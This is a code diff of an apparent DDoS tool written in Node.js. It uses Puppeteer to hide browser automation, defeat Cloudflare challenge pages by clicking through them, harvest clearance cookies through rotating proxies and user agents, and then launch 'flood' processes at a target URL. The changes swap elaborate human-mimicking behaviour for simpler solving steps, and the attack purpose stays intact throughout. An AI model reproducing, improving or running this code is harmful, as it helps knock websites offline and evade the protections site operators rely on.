@@ -16,7 +16,7 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
-// ========== HUMAN-LIKE CAPTCHA SOLVING ==========
+// ========== PRAGMATIC CHALLENGE SOLVING ==========
 const bypassFirewall = async (page) => {
     await page.evaluateOnNewDocument(() => {
         Object.defineProperty(navigator, 'webdriver', { get: () => false });
@@ -121,229 +121,138 @@ const getFirewallBypassArgs = () => [
     '--max_old_space_size=4096'
 ];
 
-// HUMAN-LIKE CAPTCHA SOLVING STRATEGIES
+// SIMPLE & EFFECTIVE CHALLENGE SOLVING
 const solveAdvancedChallenge = async (page, browserProxy) => {
     try {
-        coloredLog(COLORS.WHITE, `[INFO] Starting human-like solving for: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.WHITE, `[INFO] Checking for challenge: ${maskProxy(browserProxy)}`);
         
-        // Initial observation period - like human reading the page
-        await sleep(3 + Math.random() * 4);
+        // Wait a bit for page to stabilize
+        await sleep(3);
         
+        // Check current state
         const currentUrl = page.url();
         const title = await page.title().catch(() => '');
-        const content = await page.content().catch(() => '');
-
+        
+        // Simple challenge detection
         const isChallenge = title.includes('Just a moment') || 
                            title.includes('Checking your browser') ||
-                           content.includes('challenge-platform') ||
-                           content.includes('cf-browser-verification') ||
-                           currentUrl.includes('challenges.cloudflare.com') ||
-                           content.includes('Enable JavaScript and cookies to continue');
+                           currentUrl.includes('challenges.cloudflare.com');
 
         if (!isChallenge) {
-            coloredLog(COLORS.GREEN, `[INFO] No challenge detected for: ${maskProxy(browserProxy)}`);
+            coloredLog(COLORS.GREEN, `[INFO] No challenge detected: ${maskProxy(browserProxy)}`);
             return true;
         }
 
-        coloredLog(COLORS.WHITE, `[INFO] Challenge detected, human-solving for: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.YELLOW, `[INFO] Challenge found, solving: ${maskProxy(browserProxy)}`);
 
-        // STRATEGY 1: Natural waiting with human-like behavior
-        coloredLog(COLORS.YELLOW, `[INFO] Strategy 1: Natural waiting (like human reading)`);
+        // STRATEGY 1: Wait for auto-redirect (most common case)
+        coloredLog(COLORS.WHITE, `[INFO] Strategy 1: Waiting for auto-solve`);
+        await sleep(8);
         
-        // Simulate human reading the page
-        await page.evaluate(() => {
-            window.scrollBy(0, 100);
-        }).catch(() => {});
-        await sleep(2);
-        
-        await page.mouse.move(100, 200, { steps: 5 }).catch(() => {});
-        await sleep(1);
-        
-        try {
-            await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 25000 });
-            coloredLog(COLORS.GREEN, `[INFO] Auto-solve successful for: ${maskProxy(browserProxy)}`);
+        // Check if solved after waiting
+        const newTitle = await page.title().catch(() => '');
+        const newUrl = page.url();
+        if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
+            coloredLog(COLORS.GREEN, `[INFO] Auto-solve successful: ${maskProxy(browserProxy)}`);
             return true;
-        } catch (e) {}
+        }
 
-        // STRATEGY 2: Human-like interaction with challenge elements
-        coloredLog(COLORS.YELLOW, `[INFO] Strategy 2: Human-like element interaction`);
+        // STRATEGY 2: Look for and click the main challenge button
+        coloredLog(COLORS.WHITE, `[INFO] Strategy 2: Looking for challenge button`);
         
-        const humanSelectors = [
-            'input[type="submit"]', 'button', '.btn', '#challenge-submit', '[type="submit"]',
-            'input[value="Submit"]', 'a', '.cf-btn', '.success', '#success', 'div[role="button"]',
-            '[onclick]', '.button', '.submit', '.verify', '.continue', '.proceed',
-            '#verify-human', '.human-verify', '.challenge-form', 'form'
+        const challengeButtons = [
+            // Cloudflare specific
+            'input[type="submit"][value*="Verify"]',
+            'button[type*="submit"]',
+            '.btn',
+            '#challenge-submit',
+            '[type="submit"]',
+            // General buttons
+            'button',
+            'input[type="submit"]',
+            'a[href*="challenge"]',
+            '.verify-btn',
+            '.success-button'
         ];
 
-        for (const selector of humanSelectors) {
+        for (const selector of challengeButtons) {
             try {
-                const elements = await page.$$(selector);
-                for (const element of elements.slice(0, 2)) { // Only try first 2 elements
-                    try {
-                        // Human-like hover before click
-                        const box = await element.boundingBox().catch(() => null);
-                        if (box) {
-                            // Move mouse to element like human
-                            await page.mouse.move(
-                                box.x + box.width / 2, 
-                                box.y + box.height / 2, 
-                                { steps: 10 + Math.floor(Math.random() * 10) }
-                            ).catch(() => {});
-                            await sleep(0.5 + Math.random() * 1);
-                        }
-                        
-                        // Human-like click with slight delay
-                        await element.click({ delay: 100 + Math.random() * 200 }).catch(() => {});
-                        
-                        // Wait like human would after clicking
-                        await sleep(3 + Math.random() * 3);
-                        
-                        // Check if solved
-                        const newTitle = await page.title().catch(() => '');
-                        const newUrl = page.url();
-                        
-                        if (!newTitle.includes('Just a moment') && 
-                            !newTitle.includes('Checking your browser') &&
-                            !newUrl.includes('challenges.cloudflare.com')) {
-                            coloredLog(COLORS.GREEN, `[INFO] Human-click solved via ${selector} for: ${maskProxy(browserProxy)}`);
-                            return true;
-                        }
-                    } catch (e) {}
+                const button = await page.$(selector);
+                if (button) {
+                    coloredLog(COLORS.YELLOW, `[INFO] Found button with selector: ${selector}`);
+                    
+                    // Simple click without complex movements
+                    await button.click().catch(() => {});
+                    await sleep(5);
+                    
+                    // Check if solved
+                    const postClickTitle = await page.title().catch(() => '');
+                    if (!postClickTitle.includes('Just a moment') && !postClickTitle.includes('Checking your browser')) {
+                        coloredLog(COLORS.GREEN, `[INFO] Button click solved: ${maskProxy(browserProxy)}`);
+                        return true;
+                    }
                 }
             } catch (e) {}
         }
 
-        // STRATEGY 3: Advanced human behavior simulation
-        coloredLog(COLORS.YELLOW, `[INFO] Strategy 3: Advanced human behavior`);
-        
-        // Complex human-like browsing pattern
-        const viewport = page.viewport();
-        
-        // Reading pattern - scroll and pause like human
-        for (let i = 0; i < 3; i++) {
-            await page.evaluate(() => {
-                window.scrollBy(0, 150 + Math.random() * 200);
-            }).catch(() => {});
-            await sleep(1 + Math.random() * 2); // Reading time
-        }
-        
-        // Natural mouse movements while thinking
-        for (let i = 0; i < 4; i++) {
-            const x = Math.random() * viewport.width * 0.7 + viewport.width * 0.15;
-            const y = Math.random() * viewport.height * 0.7 + viewport.height * 0.15;
-            await page.mouse.move(x, y, { 
-                steps: 8 + Math.floor(Math.random() * 8) 
-            }).catch(() => {});
-            await sleep(0.3 + Math.random() * 0.5);
-        }
-
-        // STRATEGY 4: Form interaction like human
-        coloredLog(COLORS.YELLOW, `[INFO] Strategy 4: Human form interaction`);
-        
-        const inputSelectors = [
-            'input[type="text"]', 'input[type="email"]', 'textarea', 
-            'input[name="answer"]', 'input[name="response"]', 'input[type="checkbox"]'
-        ];
-
-        for (const selector of inputSelectors) {
-            try {
-                const inputs = await page.$$(selector);
-                for (const input of inputs.slice(0, 2)) {
-                    try {
-                        // Human-like focus
-                        await input.click({ delay: 200 }).catch(() => {});
-                        await sleep(0.5 + Math.random() * 1);
-                        
-                        // Type like human with mistakes and corrections
-                        const humanTexts = ['yes', 'verify', 'human', 'continue', 'ok'];
-                        const text = humanTexts[Math.floor(Math.random() * humanTexts.length)];
-                        
-                        for (let i = 0; i < text.length; i++) {
-                            await input.type(text[i], { 
-                                delay: 80 + Math.random() * 120 
-                            }).catch(() => {});
-                            
-                            // Occasional pause like human thinking
-                            if (Math.random() < 0.2) {
-                                await sleep(0.2 + Math.random() * 0.3);
-                            }
-                        }
-                        
-                        await sleep(1); // Human pause before submit
-                        
-                        // Look for submit button and click like human
-                        const submitSelectors = [
-                            'input[type="submit"]', 'button[type="submit"]', 
-                            '.submit-btn', '[type="submit"]'
-                        ];
-                        
-                        for (const submitSelector of submitSelectors) {
-                            try {
-                                const submit = await page.$(submitSelector);
-                                if (submit) {
-                                    // Human-like move to submit button
-                                    const submitBox = await submit.boundingBox().catch(() => null);
-                                    if (submitBox) {
-                                        await page.mouse.move(
-                                            submitBox.x + submitBox.width / 2,
-                                            submitBox.y + submitBox.height / 2,
-                                            { steps: 12 }
-                                        ).catch(() => {});
-                                        await sleep(0.3);
-                                    }
-                                    
-                                    await submit.click({ delay: 150 }).catch(() => {});
-                                    await sleep(4); // Wait for submission
-                                    
-                                    const newTitle = await page.title().catch(() => '');
-                                    if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
-                                        coloredLog(COLORS.GREEN, `[INFO] Human form submission solved for: ${maskProxy(browserProxy)}`);
-                                        return true;
-                                    }
-                                }
-                            } catch (e) {}
-                        }
-                    } catch (e) {}
-                }
-            } catch (e) {}
-        }
-
-        // STRATEGY 5: Iframe interaction like human
-        coloredLog(COLORS.YELLOW, `[INFO] Strategy 5: Human iframe interaction`);
-        
+        // STRATEGY 3: Check for iframe challenges
+        coloredLog(COLORS.WHITE, `[INFO] Strategy 3: Checking iframes`);
         try {
             const frames = await page.frames();
             for (const frame of frames) {
                 try {
-                    const frameButtons = await frame.$$('button, input[type="submit"], [role="button"]');
-                    for (const button of frameButtons.slice(0, 2)) {
-                        try {
-                            await button.click({ delay: 100 }).catch(() => {});
-                            await sleep(3);
+                    const frameUrl = frame.url();
+                    if (frameUrl.includes('challenge') || frameUrl.includes('captcha')) {
+                        coloredLog(COLORS.YELLOW, `[INFO] Found challenge iframe: ${frameUrl}`);
+                        
+                        // Try to find and click any button in the iframe
+                        const iframeButton = await frame.$('button, input[type="submit"]');
+                        if (iframeButton) {
+                            await iframeButton.click().catch(() => {});
+                            await sleep(5);
                             
-                            const newTitle = await page.title().catch(() => '');
-                            if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
-                                coloredLog(COLORS.GREEN, `[INFO] Human iframe click solved for: ${maskProxy(browserProxy)}`);
+                            const postIframeTitle = await page.title().catch(() => '');
+                            if (!postIframeTitle.includes('Just a moment') && !postIframeTitle.includes('Checking your browser')) {
+                                coloredLog(COLORS.GREEN, `[INFO] Iframe click solved: ${maskProxy(browserProxy)}`);
                                 return true;
                             }
-                        } catch (e) {}
+                        }
                     }
                 } catch (e) {}
             }
         } catch (e) {}
 
-        // STRATEGY 6: Final human-like refresh
-        coloredLog(COLORS.YELLOW, `[INFO] Strategy 6: Human-like page refresh`);
-        
-        await page.evaluate(() => {
-            // Clear storage like human troubleshooting
-            localStorage.clear();
-            sessionStorage.clear();
-        }).catch(() => {});
-        
-        // Human-like refresh with F5 simulation
-        await page.keyboard.press('F5').catch(() => {});
-        await sleep(6); // Wait for reload like human
+        // STRATEGY 4: Simple form interaction
+        coloredLog(COLORS.WHITE, `[INFO] Strategy 4: Form interaction`);
+        try {
+            const textInputs = await page.$$('input[type="text"], input[type="email"], textarea');
+            for (const input of textInputs.slice(0, 2)) {
+                try {
+                    await input.click().catch(() => {});
+                    await sleep(1);
+                    await input.type('verify', { delay: 100 }).catch(() => {});
+                    await sleep(2);
+                    
+                    // Find and click submit
+                    const submitBtn = await page.$('input[type="submit"], button[type="submit"]');
+                    if (submitBtn) {
+                        await submitBtn.click().catch(() => {});
+                        await sleep(5);
+                        
+                        const postFormTitle = await page.title().catch(() => '');
+                        if (!postFormTitle.includes('Just a moment') && !postFormTitle.includes('Checking your browser')) {
+                            coloredLog(COLORS.GREEN, `[INFO] Form submission solved: ${maskProxy(browserProxy)}`);
+                            return true;
+                        }
+                    }
+                } catch (e) {}
+            }
+        } catch (e) {}
+
+        // STRATEGY 5: Final attempt - refresh and wait
+        coloredLog(COLORS.WHITE, `[INFO] Strategy 5: Refresh and wait`);
+        await page.reload().catch(() => {});
+        await sleep(10);
         
         const finalTitle = await page.title().catch(() => '');
         const finalUrl = page.url();
@@ -351,19 +260,18 @@ const solveAdvancedChallenge = async (page, browserProxy) => {
         if (!finalTitle.includes('Just a moment') && 
             !finalTitle.includes('Checking your browser') &&
             !finalUrl.includes('challenges.cloudflare.com')) {
-            coloredLog(COLORS.GREEN, `[INFO] Human refresh solved for: ${maskProxy(browserProxy)}`);
+            coloredLog(COLORS.GREEN, `[INFO] Refresh solved: ${maskProxy(browserProxy)}`);
             return true;
         }
 
-        coloredLog(COLORS.RED, `[INFO] All human-solving strategies failed for: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.RED, `[INFO] All strategies failed: ${maskProxy(browserProxy)}`);
         return false;
 
     } catch (error) {
-        coloredLog(COLORS.RED, `[INFO] Human-solving error: ${error.message}`);
+        coloredLog(COLORS.RED, `[INFO] Solver error: ${error.message}`);
         return false;
     }
 };
-// ========== END HUMAN-LIKE CAPTCHA SOLVING ==========
 
 // Command-line argument validation
 if (process.argv.length < 6) {
@@ -451,7 +359,7 @@ const userAgents = [
     `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
 ];
 
-// Enhanced human-like browser launch
+// SIMPLIFIED Browser launch
 const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
     const userAgent = randomElement(userAgents);
     let browser;
@@ -478,37 +386,38 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
     };
 
     try {
-        coloredLog(COLORS.YELLOW, `[INFO] Launching human-like browser for: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.YELLOW, `[INFO] Launching: ${maskProxy(browserProxy)}`);
         browser = await puppeteer.launch(options);
         const [page] = await browser.pages();
 
-        // Apply human-like behavior
+        // Apply bypass
         await bypassFirewall(page);
 
-        // Human-like navigation
+        // Simple navigation with longer timeout
         await page.goto(targetURL, { 
             waitUntil: 'domcontentloaded',
-            timeout: 45000 
+            timeout: 60000 
         }).catch(() => {});
 
-        // Human-like challenge solving
+        // Solve challenge
         const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
         
         if (!challengeSolved) {
-            throw new Error('Human-solving failed');
+            throw new Error('Challenge solving failed');
         }
 
-        // Get cookies after successful human-like interaction
-        const cookies = await page.cookies().catch(() => []);
+        // Get cookies
+        await sleep(2);
+        const cookies = await page.cookies(targetURL).catch(() => []);
         const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
 
         if (!cookieString) {
             throw new Error('No cookies obtained');
         }
 
-        coloredLog(COLORS.GREEN, `[INFO] HUMAN SUCCESS for: ${maskProxy(browserProxy)}`);
+        coloredLog(COLORS.GREEN, `[INFO] SUCCESS: ${maskProxy(browserProxy)}`);
         totalSolves++;
-        coloredLog(COLORS.GREEN, `[INFO] Total human solves: ${totalSolves}`);
+        coloredLog(COLORS.GREEN, `[INFO] Total solves: ${totalSolves}`);
 
         await browser.close();
         return { cookies: cookieString, userAgent };
@@ -516,14 +425,16 @@ const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxR
     } catch (error) {
         if (browser) await browser.close().catch(() => {});
         if (attempt < maxRetries) {
+            coloredLog(COLORS.YELLOW, `[INFO] Retrying... (${attempt}/${maxRetries})`);
             await sleep(3);
             return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
         }
+        coloredLog(COLORS.RED, `[INFO] Failed after ${maxRetries} attempts: ${maskProxy(browserProxy)}`);
         return null;
     }
 };
 
-// Thread handling dengan human-like approach
+// Thread handling
 const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
     if (retries >= COOKIES_MAX_RETRIES) {
         done(null, { task });
@@ -558,7 +469,7 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
                 });
 
                 floodProcess.unref();
-                coloredLog(COLORS.GREEN, `[INFO] Spawned flood process for: ${maskProxy(browserProxy)}`);
+                coloredLog(COLORS.GREEN, `[INFO] Flood process spawned: ${maskProxy(browserProxy)}`);
                 
             } catch (error) {
                 coloredLog(COLORS.RED, `[INFO] Spawn error: ${error.message}`);
@@ -579,7 +490,7 @@ const queue = async.queue((task, done) => {
 }, threads);
 
 queue.drain(() => {
-    coloredLog(COLORS.GREEN, '[INFO] All human-solving completed');
+    coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
 });
 
 // Main execution
@@ -590,7 +501,7 @@ const main = async () => {
         process.exit(1);
     }
 
-    coloredLog(COLORS.GREEN, `[INFO] Starting HUMAN-LIKE attack with ${proxies.length} proxies`);
+    coloredLog(COLORS.GREEN, `[INFO] Starting with ${proxies.length} proxies`);
 
     proxies.forEach(browserProxy => queue.push({ browserProxy }));
 
@@ -605,11 +516,15 @@ const main = async () => {
     }, duration * 1000);
 };
 
-process.on('uncaughtException', (error) => {});
-process.on('unhandledRejection', (error) => {});
+process.on('uncaughtException', (error) => {
+    coloredLog(COLORS.RED, `[UNCAUGHT] ${error.message}`);
+});
+process.on('unhandledRejection', (error) => {
+    coloredLog(COLORS.RED, `[UNHANDLED] ${error.message}`);
+});
 
-coloredLog(COLORS.GREEN, '[INFO] HUMAN-LIKE CAPTCHA SOLVING ACTIVE');
+coloredLog(COLORS.GREEN, '[INFO] Starting challenge solver...');
 main().catch(err => {
-    coloredLog(COLORS.RED, `[INFO] Error: ${err.message}`);
+    coloredLog(COLORS.RED, `[INFO] Main error: ${err.message}`);
     process.exit(1);
 });
